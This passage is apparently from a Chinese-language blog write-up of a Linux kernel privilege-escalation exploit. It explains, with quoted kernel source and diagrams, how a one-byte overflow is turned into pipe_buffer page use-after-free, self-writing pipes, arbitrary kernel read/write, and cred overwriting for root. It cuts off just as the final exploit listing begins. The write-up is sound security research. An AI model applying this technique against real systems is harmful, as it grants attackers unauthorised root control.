class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里简单说一下在本次利用当中较为重要字段的含义</p><ul><li>page:该pipe_buffer所容纳内容的页面</li><li>offset:该pipe_buffer数据在page页面的偏移，同时也是read系统调用的指针所在</li><li>len:该pipe_buffer数据总共的长度，offset+len就是write系统调用的指针所在</li></ul><p>可以看到该结构体开头即为<code>struct page</code>的一个指针，且该page结构体大小为0x40字节，其刚好可以被0x100整除（也就是说page结构体指针的低一字节只可能是<code>\x00</code>,<code>\x40</code>,<code>\x80</code>,<code>\xc0</code>），因此我们即可断定在堆喷的情况下，我们可以覆盖某个pipe_buffer的开头低一字节为<code>\x00</code>，来使得他指向某个其他pipe_buffer指向的page结构体，具体情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd40ced8b03e78b87d6277ff930.jpg"></p><p>上面是初始分配的两个pipe_buffer,接下来我们假定其中一个pipe_buffer的page指针低一子节为<code>\x00</code>（1&#x2F;4的概率</p><p>然后我们利用空字节溢出，将下面低字节非<code>\x00</code>进行溢出</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/03087bf40ad162d921285b2e57dfa9ec8a13cd3a.jpg"></p><p>此时即可将两者的指针指向同一个page结构体，然后通过释放其中一个管道来使得构造成页级UAF</p><p>但是这里的一个问题就是，pipe_buffer每次调用是从kmalloc-cg-1k进行获取，伙伴系统中则是从order-2当中取得，而我们的legacy_data则是从kmalloc-cg-4k中获取，伙伴系统则是从order-3当中取出，因此我们不能通过寻常的函数获取pipe_buffer,如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/562c11dfa9ec8a13b08b73d2b103918fa0ecc06b.jpg"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>get_pipe_inode <span class="hljs-comment">//对于该管道inode的fops赋值为pipefifo_fops</span><br><span class="hljs-function">alloc_pipe_info</span><br><span class="hljs-function"><span class="hljs-title">kzalloc</span><span class="hljs-params">(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT)</span></span><br><span class="hljs-function"><span class="hljs-title">kcalloc</span><span class="hljs-params">(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT)</span></span><br></code></pre></td></tr></table></figure><p>该链条会导致pipe_buffer从kmalloc-cg-1k当中获取，其中pipe_bufs在函数开头被指定为一个常数16，且pipe_buffer结构体的大小为0x28,这俩相乘了分配得<code>512&lt;0x280&lt;0x400</code>,因此他会从kmalloc-cg-1k、order-2当中取得</p><p>所以这里我们考虑其他的方式来修改我们pipe_buffer的大小</p><p>要改这个kcalloc中pipe_bufs的大小，在pipe系统调用的过程中是万不可行，但是我们可以利用到fcntl这样一个系统调用，我们可以来稍微查看一下其中的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(fcntl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_raw(fd);<br><span class="hljs-type">long</span> err = -EBADF;<br><br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">if</span> (unlikely(f.file-&gt;f_mode &amp; FMODE_PATH)) &#123;<br><span class="hljs-keyword">if</span> (!check_fcntl_cmd(cmd))<br><span class="hljs-keyword">goto</span> out1;<br>&#125;<br><br>err = security_file_fcntl(f.file, cmd, arg);<br><span class="hljs-keyword">if</span> (!err)<br>err = do_fcntl(fd, cmd, arg, f.file);<br><br>out1:<br> fdput(f);<br>out:<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_fcntl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br><span class="hljs-type">void</span> __user *argp = (<span class="hljs-type">void</span> __user *)arg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> <span class="hljs-title">flock</span>;</span><br><span class="hljs-type">long</span> err = -EINVAL;<br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>...<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br><span class="hljs-keyword">case</span> F_GETPIPE_SZ:<br>err = pipe_fcntl(filp, cmd, arg);<br><span class="hljs-keyword">break</span>;<br><br>...<br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过cmd指令<code>F_SETPIPE_SZ</code>,我们可以调用pipe_fcntl这样一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br><br>...<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-keyword">break</span>;<br>...<br>&#125;<br><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用pipe_set_size，这个函数对我们的诱惑极大，光函数名即可猜测其中我们可以设置pipe_buffer的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配一个pipe_buffer的新数组（也就是调用了kcalloc) 并且把以往的数据复制到上面. </span><br><span class="hljs-comment"> * 如果成功则返回大小, 错误则返回-ERROR .</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots, size;<br><span class="hljs-type">long</span> ret = <span class="hljs-number">0</span>;<br><br>size = round_pipe_size(arg);<br>nr_slots = size &gt;&gt; PAGE_SHIFT;<br><br>...<br>        <br>ret = pipe_resize_ring(pipe, nr_slots);<br>...<br>        <br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用pipe_resize_ring来重新分配pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Resize the pipe ring to a number of slots.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br>...<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br>...<br>kfree(pipe-&gt;bufs);<br>pipe-&gt;bufs = bufs;<br>pipe-&gt;ring_size = nr_slots;<br><span class="hljs-keyword">if</span> (pipe-&gt;max_usage &gt; nr_slots)<br>pipe-&gt;max_usage = nr_slots;<br>pipe-&gt;tail = tail;<br>pipe-&gt;head = head;<br><br><span class="hljs-comment">/* This might have made more room for writers */</span><br>wake_up_interruptible(&amp;pipe-&gt;wr_wait);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，我们此时传入的nr_slots若为64，也就是之前的4倍，那么总共分配得大小为<code>2k&lt;0xA00&lt;4k</code>我们便可以将我们的pipe_buffer从kmalloc-cg-4k当中分配，就可以和我们之前的legacy_data进行互动</p><h3 id="2-任意地址读-x2F-写"><a href="#2-任意地址读-x2F-写" class="headerlink" title="2.任意地址读&#x2F;写"></a>2.任意地址读&#x2F;写</h3><p>接下来我们将从单字节的溢出，直到实现任意地址读写</p><h4 id="step-I：构造1级UAF"><a href="#step-I：构造1级UAF" class="headerlink" title="step I：构造1级UAF"></a>step I：构造1级UAF</h4><p>我们首先大量堆喷pipe,这是为了之后我们重复分配提供条件，</p><p>然后我们同之前基地址泄露类似，堆喷msg_msg,然后我们就可以利用溢出来将msg_msg的m_ts字段覆盖为一个大值来进行越界读，会成为下面这种情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e4345d95209c2d56285356844.jpg"></p><p>这样我们就可以再次通过任意写再来覆盖相邻的msg_msg的下一个msg_msg，且刚好溢出一个空子节</p><p>（为什么不直接溢出legacy_fs_context的相邻msg_msg呢，这是因为我们由于需要创造一个漏洞的整数溢出，所以在我们溢出的第一个相邻msg_msg的时候必定会写入一个<code>=</code>和<code>\x00</code>，因此我们选则溢出到下一个4k页面）</p><p>而本次我们利用到的结构体为pipe_buffer，根据上面我们的初期知识准备知道，我们可以通过fcntl来修改pipe_buffer的大小，我们将其改为一次分配64个buffer，也就是64*0x28大小，该堆块刚好也是从order-3来分配，因此我们可以通过释放掉msg_msg接着利用fcntl重分配pipe_buffer来构造溢出条件</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd526684c54b26ed18972bd4073611.jpg"></p><p>这样我们继续写入legacy_data，直到恰好使得我们（broken）msg_msg下一个相邻pipe_buffer的page指针低1字节为<code>\x00</code></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b7fd5266d0160924fdc1d529920735fae6cd341f.jpg"></p><p>这样我们大概率就可以构造出两个pipe_buffer同时指向同一个page,情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1b4c510fd9f9d72aa7b0672f922a2834349bbb28.jpg"></p><h4 id="step-II：构造二级UAF"><a href="#step-II：构造二级UAF" class="headerlink" title="step II：构造二级UAF"></a>step II：构造二级UAF</h4><p>此时我们如果释放掉其中一个pipe,那么我们就会释放掉该page对应的物理页面，因此就构成了一个UAF，此时我们若再次分配pipe_buffer，我们就会从刚释放掉的4k obj当中分配，就构成如下情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/91ef76c6a7efce1b98efbff8e951f3deb48f653f.jpg"></p><p>此时我们可以再次构造一个UAF，这里构造的目的主要是为了任意修改之后的页面，然后我们再次重复上次的操作，再次重分配pipe_buffer如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f6030f80ea757f12b31bb051edd4.jpg"></p><h4 id="step-III：构造自写管道"><a href="#step-III：构造自写管道" class="headerlink" title="step III：构造自写管道"></a>step III：构造自写管道</h4><p>这里我们已知将目前二级UAF所指向的页面分配了多个pipe_buffer，此时我们将其中的一个pipe_buffer指向上一级，也就是自身物理页面所对应的struct page，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd11317e7c1001cafa40f4bfb05dd.jpg"></p><p>此时我们的最后一级pipe_buffer就可以往自身存在的页面进行写入了</p><h4 id="step-IV：构造任意读写系统"><a href="#step-IV：构造任意读写系统" class="headerlink" title="step IV：构造任意读写系统"></a>step IV：构造任意读写系统</h4><p>我们目前可以写入自身的页面，看起来好像跟任意读写没什么关联，但接下来构造的读写系统才算是精妙所在</p><p>首先我们同时构建三个上述的自写管道</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b13632762d0f70335aee3ee4efa513d2697c5e0.jpg"></p><p>当同时在一个page内存在三个自写管道时，我们就可以通过不断修改他们之间的offset&#x2F;len字段来达成重复的利用读&#x2F;写，其中各个管道的功能如下</p><ul><li>管道1用来在任意内存中进行读&#x2F;写</li><li>管道2用来修正复原我们的管道3</li><li>管道3用来修改我们的管道1和恢复我们的管道2</li></ul><p>通过上面三个自写管道我们就可以达成任意地址读写，这个系统可能在讲述时不好理解，这里需要对于其中的代码以及pipe_buffer的布局了解透彻才想的清楚，但是想清楚之后是十分顺畅的~</p><h3 id="3-地址泄漏和权限提升"><a href="#3-地址泄漏和权限提升" class="headerlink" title="3.地址泄漏和权限提升"></a>3.地址泄漏和权限提升</h3><p>我们知道page对于物理地址页面的映射是线性的，而struct page数据结构体数组存放在vmemmap区域</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8644ebf81a4c510f18d391282659252dd42aa5e9.jpg"></p><p>因此若我们知道了vmemmap_base基地址，则可以读写数组当中所有的物理页面</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br></code></pre></td></tr></table></figure><p>而KASLR的粒度是256MB，所以根据上面构造自写管道的过程我们得到了一个page结构体的地址，通过它可以得出一个可能正确的vmemmap_base，也就是将低28位取0即可</p><p>这里说可能的原因也是因为当我们的内存大于16GB的时候，那么我们pages数组的大小便会大于(0x400000000&#x2F;0x1000)*0x40&#x3D; 0x10000000,此时就刚好超过KASLR的粒度，所以我们直接取0是一个可能的值，因此还需要判断一下获取到的vmemmap_base的正确性</p><p>至于正确性的判断，在实模式当中我们需要用到一个写入的汇编函数<code>secondary_startup_64</code>，该函数被应用到linux内核的启动过程中，且在物理内存偏移0x9d000的地方会存放该函数的一个指针，（这里固定的原因我猜可能是在由于实模式下直接使用物理地址，所以就直接将其存放在固定的位置拿来使用）</p><p>我们同样可以将内核用objdump进行查看也可以看到该函数，就刚好处于开头这一部分</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f6031f6dfa757f12b31bb051ed27.jpg"></p><p>可以看到他的一个地址是在内核text代码段偏移0x30的地址，因此我们使用这个点来进行检测</p><p>通过上述方法，我们即可得到内核基地址，此时我们还需要知道我们的page_offset_base,也就是我们physmap所对应的虚拟地址，此时用到task_struct中的一个字段ptraced,该字段在我们的进程没有被附加的时候会指向其自身，且该地址位于我们的physmap当中</p><p>当我们知道了physmap线性映射区的基地址，那么我们就可以知道某个虚拟地址所对应的page结构体，因此就达成了真正意义上的任意地址读写，此时我们可以利用它来找到我们本进程的task_struct（寻找的方式就是利用prctl函数的PR_SET_NAME来修改进程taskt_struct的comm字段，使用它来做一个标记，然后在页面寻找），然后通过其中的parent字段向上寻找，也就是不断找寻父进程，直到找到最终的init进程，但是我个人在调试过程中发现最终找到的是swapper进程，其pid为0，init进程pid为1，但是这并不影响最终我们的提权</p><p>最终我们只需要将init&#x2F;swapper进程的cred字段的地址赋值给当前进程的cred字段即可达成提权，效果如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/aa64034f78f0f736e8e013334c55b319ebc413e1.jpg"></p><p>最终的exploit如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 